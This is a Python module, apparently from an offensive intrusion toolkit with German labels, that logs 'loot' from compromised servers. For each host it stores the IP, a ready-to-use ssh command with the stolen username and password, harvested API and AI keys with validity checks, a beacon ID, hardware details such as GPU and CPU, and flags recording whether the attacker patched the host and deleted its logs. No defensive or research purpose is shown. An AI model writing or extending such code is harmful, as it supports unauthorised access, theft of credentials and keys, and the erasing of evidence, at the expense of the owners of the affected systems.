from __future__ import annotations
import json
import os
from datetime import datetime, timezone
from .audit import _lock

DIR = os.path.join(os.path.dirname(os.path.dirname(__file__)), "loot")


def write(t, access, php: str, patched: bool, cleaned: bool, info: dict | None = None):
    os.makedirs(DIR, exist_ok=True)
    ts = datetime.now(timezone.utc).isoformat(timespec="seconds")
    info = info or {}
    port = t.port
    sport = port if port in (22, 2222) else 22
    ssh = f"ssh -p {sport} {access.locator}@{t.host}" if access.kind in ("root", "shell") else ""
    rec = {"ts": ts, "ip": t.host, "port": port, "ssh": ssh, "url": t.url, "php": php or "",
           "user": access.locator, "pass": access.secret, "kind": access.kind,
           "patched": patched, "cleaned": cleaned, "beacon": info.get("beacon",""), "info": info}
    with _lock:
        with open(os.path.join(DIR, "loot.jsonl"), "a") as f:
            f.write(json.dumps(rec, ensure_ascii=False) + "\n")
        with open(os.path.join(DIR, "loot.txt"), "a") as f:
            f.write("=" * 78 + "\n")
            f.write(f"[{ts}]  {t.host}:{port}   ({access.kind})\n")
            if ssh:
                f.write(f"  ZUGANG : {ssh}\n")
                f.write(f"  PASSW  : {access.secret}\n")
            elif access.kind in ("keys", "ai"):
                f.write(f"  WERT   : {access.locator}\n  DATEN  : {access.secret}\n")
            else:
                f.write(f"  ZUGANG : {access.locator} / {access.secret}\n")
            f.write(f"  URL    : {t.url}\n")
            if t.php_version:
                f.write(f"  PHP    : {t.php_version}\n")
            f.write(f"  SYSTEM : {info.get('os','?')} | {info.get('virt','')}\n")
            f.write(f"  CPU    : {info.get('cpu','?')} ({info.get('cores','?')} Kerne)\n")
            f.write(f"  RAM    : {info.get('rammb','?')} MB   DISK: {info.get('disk','?')}\n")
            if info.get("gpu"):
                f.write(f"  GPU    : {info.get('gpu')}\n")
            if info.get("keys"):
                f.write(f"  KEYS   : {', '.join(info['keys'])}\n")
            if info.get("keycheck"):
                f.write("  KEYCHK : " + ", ".join(f"{k}={v}" for k, v in info["keycheck"].items()) + "\n")
            if info.get("beacon"):
                f.write(f"  BEACON : {info['beacon']}\n")
            f.write(f"  PATCH  : {'ja' if patched else 'nein'}   LOGS: {'geloescht' if cleaned else 'offen'}\n")
            f.write("\n")
    return rec
